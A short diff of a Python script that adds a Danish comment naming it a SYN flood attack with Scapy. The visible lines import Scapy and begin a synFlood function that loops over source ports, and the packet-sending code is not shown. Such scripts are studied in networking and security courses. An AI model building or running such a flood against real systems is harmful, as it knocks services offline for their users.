@@ -1,6 +1,4 @@
-
-#!/usr/bin/python
-
+#Syn Flood angreb med Scapy
 from scapy.all import *
 def synFlood(src, tgt):
 	for sport in range (1024, 65535):
